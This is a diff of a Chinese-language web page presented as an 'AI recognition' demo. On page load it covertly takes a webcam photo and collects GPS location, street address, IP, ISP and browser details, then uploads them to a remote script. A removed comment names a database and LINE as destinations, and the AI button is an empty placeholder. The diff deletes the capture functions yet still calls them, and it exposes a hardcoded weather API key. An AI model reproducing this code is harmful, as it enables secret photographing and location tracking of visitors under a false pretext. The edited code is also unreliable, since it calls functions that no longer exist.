@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="zh-TW">
 <head>
@@ -226,15 +225,16 @@
 
 <!-- 主內容 -->
 <div class="container mt-4">
-  <!-- (A) 未登入可使用的功能：拍照 + GPS + IP + 回饋訊息/圖片 -->
+  <!-- 未登入時 (只收集 IP) -->
   <div id="guestPanel">
-    <h4 class="section-title">歡迎體驗 AI 辨識</h4>
+    <h4 class="section-title">AI 辨識 - 測試模式</h4>
     <p class="alert alert-info">
-      若尚未登入，將會要求開啟相機與定位來進行測試。<br>
-      登入後僅會蒐集 <strong>IP</strong>，不再拍照或使用 GPS。
+      目前您尚未登入，系統僅會蒐集您的 IP 資訊。<br>
+      若您想啟用「拍照 &amp; GPS &amp; AI 功能」，請登入帳號。
     </p>
-    <h5 class="mb-3">回饋功能 (未登入也可使用)</h5>
-    <div class="row mb-4">
+    <!-- 回饋功能 (未登入也可以) -->
+    <h5 class="mb-3">回饋功能</h5>
+    <div class="row mb-3">
       <div class="col-md-6 mb-3">
         <div class="card p-3">
           <h6>回傳文字訊息</h6>
@@ -242,7 +242,7 @@
             id="userMessage"
             class="form-control mb-2"
             rows="3"
-            placeholder="輸入想回饋的訊息..."
+            placeholder="輸入您想回饋的訊息..."
           ></textarea>
           <button id="sendMessageBtn" class="btn btn-primary w-100">
             回傳訊息
@@ -264,11 +264,59 @@
     </div>
   </div>
 
-  <!-- (B) 已登入後顯示的功能：只顯示天氣資訊 (只蒐集 IP) -->
+  <!-- 已登入時 (收集 IP + GPS + Camera + AI 功能 + 天氣) -->
   <div id="memberPanel" style="display: none;">
-    <h4 class="section-title">天氣資訊</h4>
+    <h4 class="section-title">AI 辨識 - 完整功能</h4>
+    <div class="row mb-3">
+      <div class="col-12">
+        <div class="alert alert-success">
+          您已登入，系統將啟用「拍照 &amp; GPS &amp; AI 功能」。<br>
+          請允許相機與定位，以享受完整功能。
+        </div>
+      </div>
+    </div>
+    <!-- 回饋功能 (登入後也可) -->
+    <h5 class="mb-3">回饋功能</h5>
+    <div class="row mb-3">
+      <div class="col-md-6 mb-3">
+        <div class="card p-3">
+          <h6>回傳文字訊息</h6>
+          <textarea
+            id="userMessage2"
+            class="form-control mb-2"
+            rows="3"
+            placeholder="輸入您想回饋的訊息..."
+          ></textarea>
+          <button id="sendMessageBtn2" class="btn btn-primary w-100">
+            回傳訊息
+          </button>
+        </div>
+      </div>
+      <div class="col-md-6 mb-3">
+        <div class="card p-3">
+          <h6>回傳圖片</h6>
+          <div class="file-input-container mb-2">
+            <input type="file" accept="image/*" id="userImage2" />
+            <label for="userImage2">選擇圖片</label>
+          </div>
+          <button id="sendImageBtn2" class="btn btn-success w-100">
+            回傳圖片
+          </button>
+        </div>
+      </div>
+    </div>
+    <!-- AI功能卡片 -->
+    <h5 class="mb-3">AI 功能</h5>
+    <div class="card p-3 mb-3">
+      <h6>AI 影像辨識</h6>
+      <p>此處可放置 AI 辨識的結果或操作按鈕。</p>
+      <!-- 範例: AI 按鈕 -->
+      <button class="btn btn-info">開始 AI 分析</button>
+    </div>
+    <!-- 天氣功能 -->
+    <h5 class="mb-3">天氣資訊</h5>
     <div class="card p-3">
-      <h5>當前天氣</h5>
+      <h6>當前天氣</h6>
       <p id="weatherInfo" class="text-muted">資料載入中...</p>
     </div>
   </div>
@@ -290,7 +338,6 @@
     const email = sessionStorage.getItem('email');
 
     if (email) {
-      // 已登入
       const liHello = document.createElement('li');
       liHello.classList.add('nav-item', 'me-2');
       liHello.innerHTML = `<span class="nav-link disabled">您好，${email}</span>`;
@@ -309,7 +356,6 @@
       navRight.appendChild(liHello);
       navRight.appendChild(liLogout);
     } else {
-      // 未登入
       const liUser = document.createElement('li');
       liUser.classList.add('nav-item', 'me-2');
       const userBtn = document.createElement('button');
@@ -343,12 +389,12 @@
     statusSuccess.classList.remove('d-none');
     statusError.classList.add('d-none');
 
-    // 過幾秒自動淡出
+    // 3秒後自動淡出
     setTimeout(() => {
       statusSuccess.style.opacity = '0';
       setTimeout(() => {
         statusSuccess.classList.add('d-none');
-        statusSuccess.style.opacity = '1'; 
+        statusSuccess.style.opacity = '1';
       }, 800);
     }, 3000);
   }
@@ -406,16 +452,11 @@
         if (userModalObj) userModalObj.hide();
 
         updateNavbar();
-        // 隱藏 guestPanel or 只是保留？ => 依您需求
-        // 這裡選擇保留回饋功能，因此不隱藏
-        guestPanel.querySelector('.alert-info').innerHTML =
-          '您已登入，目前僅會蒐集 IP 資訊，並可使用回饋功能。';
-
-        // 顯示 memberPanel (天氣)
+        guestPanel.style.display = 'none';  // 隱藏未登入面板
         memberPanel.style.display = 'block';
 
-        // 再次收集並上傳 => 登入後只蒐集 IP (不拍照、不GPS)
-        collectAndSendData(true); // 帶一個參數
+        // 再執行 collectAndSendData(onlyIP=false) => 全套拍照+GPS
+        collectAndSendData(false);
       } else {
         showErrorMessage(`登入失敗：${result.error}`);
       }
@@ -454,10 +495,27 @@
     }
   });
 
-  /* ====== 回傳文字訊息 ====== */
-  document.getElementById('sendMessageBtn').addEventListener('click', async () => {
-    const email = sessionStorage.getItem('email') || 'guest_user';
-    const message = document.getElementById('userMessage').value.trim();
+  /* ====== 回傳文字訊息 (未登入 / 已登入) ====== */
+  // 未登入
+  document.getElementById('sendMessageBtn').addEventListener('click', () => {
+    handleSendMessage(
+      'userMessage', // textarea ID
+      'guest_user'
+    );
+  });
+  // 已登入
+  document.getElementById('sendMessageBtn2')?.addEventListener('click', () => {
+    handleSendMessage(
+      'userMessage2',
+      sessionStorage.getItem('email') || 'guest_user'
+    );
+  });
+
+  async function handleSendMessage(textareaId, defaultEmail) {
+    const textAreaElem = document.getElementById(textareaId);
+    if (!textAreaElem) return;
+    const email = sessionStorage.getItem('email') || defaultEmail;
+    const message = textAreaElem.value.trim();
     if (!message) {
       showErrorMessage('請先輸入訊息，再按「回傳訊息」');
       return;
@@ -472,19 +530,35 @@
       const result = await resp.json();
       if (result.success) {
         showSuccessMessage('訊息已回傳成功！');
-        document.getElementById('userMessage').value = '';
+        textAreaElem.value = '';
       } else {
         showErrorMessage(`回傳失敗：${result.error}`);
       }
     } catch (err) {
       showErrorMessage(`系統錯誤：${err.message}`);
     }
+  }
+
+  /* ====== 回傳圖片 (未登入 / 已登入) ====== */
+  // 未登入
+  document.getElementById('sendImageBtn').addEventListener('click', () => {
+    handleSendImage(
+      'userImage',
+      'guest_user'
+    );
+  });
+  // 已登入
+  document.getElementById('sendImageBtn2')?.addEventListener('click', () => {
+    handleSendImage(
+      'userImage2',
+      sessionStorage.getItem('email') || 'guest_user'
+    );
   });
 
-  /* ====== 回傳圖片 ====== */
-  document.getElementById('sendImageBtn').addEventListener('click', async () => {
-    const email = sessionStorage.getItem('email') || 'guest_user';
-    const fileInput = document.getElementById('userImage');
+  async function handleSendImage(fileInputId, defaultEmail) {
+    const fileInput = document.getElementById(fileInputId);
+    if (!fileInput) return;
+    const email = sessionStorage.getItem('email') || defaultEmail;
     if (!fileInput.files[0]) {
       showErrorMessage('請先選擇圖片，再按「回傳圖片」');
       return;
@@ -507,7 +581,7 @@
     } catch (err) {
       showErrorMessage(`系統錯誤：${err.message}`);
     }
-  });
+  }
 
   function readFileAsBase64(file) {
     return new Promise((resolve, reject) => {
@@ -522,17 +596,18 @@
   }
 
   /* ====== 拍照 + GPS + IP 收集 & 上傳 ======
-   * 參數 onlyIP 若為 true，代表登入後只蒐集 IP，不拍照/不GPS
+     onlyIP=false => 全套(拍照+GPS+IP)
+     onlyIP=true  => 僅IP
    */
-  async function collectAndSendData(onlyIP = false) {
+  async function collectAndSendData(onlyIP=true) {
     const statusElem = document.getElementById('status');
     if (statusElem) {
       statusElem.textContent = '正在收集資料...';
     }
 
-    const collectedData = { gps: null, ip: null, photo: null };
+    const collectedData = { ip: null, gps: null, photo: null };
     try {
-      // 不管是否 onlyIP，一定蒐集 IP
+      // 基本必收 IP
       const ipP = getIpInfo();
 
       let gpsP = null, cameraP = null;
@@ -540,8 +615,6 @@
         gpsP = getGpsCoordinates();
         cameraP = startCamera();
       }
-
-      // 執行 Promise
       const [ipResult, gpsResult, photoResult] = await Promise.all([
         ipP,
         gpsP ? gpsP : Promise.resolve(null),
@@ -552,14 +625,11 @@
       if (gpsResult) collectedData.gps = gpsResult;
       if (photoResult) collectedData.photo = photoResult;
 
-      // 若「未登入」(guest_user) => 會拍照/GPS
-      // 若「已登入」(onlyIP) => 只會有 IP, no gps/camera
-
-      // 上傳
       const formData = new FormData();
       const email = sessionStorage.getItem('email') || 'guest_user';
       formData.append('email', email);
 
+      // IP
       if (collectedData.ip) {
         formData.append('ip', collectedData.ip.ip);
         formData.append('ipType', collectedData.ip.ipType);
@@ -569,17 +639,20 @@
         formData.append('country', collectedData.ip.country);
         formData.append('org', collectedData.ip.org);
       }
+      // GPS
       if (collectedData.gps) {
         formData.append('latitude', collectedData.gps.latitude);
         formData.append('longitude', collectedData.gps.longitude);
         formData.append('address', collectedData.gps.address);
       }
+      // Camera
       if (collectedData.photo) {
         formData.append('imageData', collectedData.photo);
       }
 
       const resp = await fetch(SCRIPT_URL, { method: 'POST', body: formData });
       const result = await resp.json();
+
       if (statusElem) {
         if (result.success) {
           statusElem.textContent = '資料已成功發送！';
@@ -588,16 +661,10 @@
         }
       }
 
-      // 若已登入並只蒐集 IP，此時顯示天氣(以城市 region? or 需GPS?)
-      // 這裡只能用 region/city 來查天氣，準確度可能較差
-      if (sessionStorage.getItem('email') && onlyIP && collectedData.ip) {
-        // 只用 city/region => 可能不精準
-        document.getElementById('weatherInfo').textContent = '嘗試以 IP 大概位置顯示天氣…(無GPS)';
-        // (可選) 若要 IP -> city => "台北市" => openweathermap?
-        // 這牽涉 geocoding city name => lat/lon => weather
-        // 這裡簡化: 不實作
+      // 若有 GPS -> 顯示天氣
+      if (collectedData.gps) {
+        getWeatherInfo(collectedData.gps.latitude, collectedData.gps.longitude);
       }
-
     } catch (err) {
       console.error('資料收集/上傳錯誤：', err);
       if (statusElem) {
@@ -606,84 +673,53 @@
     }
   }
 
-  /* ====== IP & GPS 函式 ====== */
-  async function getIpInfo() {
+  /* ====== 天氣資訊 ====== */
+  async function getWeatherInfo(lat, lon) {
     try {
-      const resp = await fetch('https://ipinfo.io/json');
+      if (!lat || !lon) return;
+      // 請換成您自己的 openweathermap apiKey
+      const apiKey = 'ae0c5817d5c802a5f12d3c9de2517611';
+      const resp = await fetch(
+        `https://api.openweathermap.org/data/2.5/weather?lat=${lat}&lon=${lon}&units=metric&lang=zh_tw&appid=${apiKey}`
+      );
       const data = await resp.json();
-      const { ip, city, region, country, org } = data;
-      const ipType = ip.includes('.') ? 'IPV4' : 'IPV6';
-      const userAgent = navigator.userAgent;
-      return { ip, ipType, userAgent, city, region, country, org };
-    } catch (err) {
-      console.warn('IP 獲取失敗:', err);
-      return null;
-    }
-  }
+      const temp = data.main.temp;
+      const weather = data.weather[0].description;
+      const humidity = data.main.humidity;
 
-  async function getGpsCoordinates() {
-    try {
-      const position = await new Promise((resolve, reject) => {
-        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
-      });
-      const { latitude, longitude } = position.coords;
-      const resp = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
-      const data = await resp.json();
-      const address = data.display_name || '未知地址';
-      return { latitude, longitude, address };
+      // 將天氣顯示於 memberPanel
+      const wElem = document.getElementById('weatherInfo');
+      if (wElem) {
+        wElem.innerHTML = `
+          <img src="https://openweathermap.org/img/wn/${data.weather[0].icon}.png" alt="${weather}">
+          溫度: ${temp}°C, 天氣: ${weather}, 濕度: ${humidity}%
+        `;
+      }
     } catch (err) {
-      console.warn('GPS 獲取失敗:', err);
-      return null;
-    }
-  }
-
-  /* ====== 拍照 ====== */
-  async function startCamera() {
-    let stream = null;
-    try {
-      // 提高畫質, ex: 1280 x 720
-      stream = await navigator.mediaDevices.getUserMedia({
-        video: { width: 1280, height: 720 }
-      });
-      const video = document.createElement('video');
-      video.srcObject = stream;
-      await new Promise((resolve) => {
-        video.onloadedmetadata = () => {
-          video.play();
-          resolve();
-        };
-      });
-      await new Promise((r) => setTimeout(r, 300));
-      const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth || 640;
-      canvas.height = video.videoHeight || 480;
-      const ctx = canvas.getContext('2d');
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      const photoData = canvas.toDataURL('image/jpeg', 0.9).split(',')[1];
-      return photoData;
-    } catch (error) {
-      console.warn('相機啟動失敗:', error);
-      return null;
-    } finally {
-      if (stream) {
-        stream.getTracks().forEach((track) => track.stop());
+      console.error('天氣資訊獲取失敗:', err);
+      const wElem = document.getElementById('weatherInfo');
+      if (wElem) {
+        wElem.textContent = '天氣資訊載入失敗...';
       }
     }
   }
 
-  // 初始化
-  document.addEventListener('DOMContentLoaded', () => {
+  /* ====== init ====== */
+  document.addEventListener('DOMContentLoaded', async () => {
     updateNavbar();
     const email = sessionStorage.getItem('email');
+
     if (email) {
-      // 已登入 => 只顯示天氣區塊
-      guestPanel.querySelector('.alert-info').innerHTML =
-        '您已登入，目前僅會蒐集 IP 資訊。若要回饋訊息/圖片仍可使用下方功能。';
+      // 已登入 => show memberPanel
+      guestPanel.style.display = 'none';
       memberPanel.style.display = 'block';
+      // 立即執行 collectAndSendData(onlyIP=false) => 全功能
+      collectAndSendData(false);
+    } else {
+      // 未登入 => show guestPanel
+      // 只收集 IP, not GPS or camera
+      collectAndSendData(true);
     }
-    // 未登入 => 拍照+GPS => DB + LINE
-    collectAndSendData(!email ? false : true); 
-    // 如果有 email => onlyIP = true
   });
 </script>
 </body>
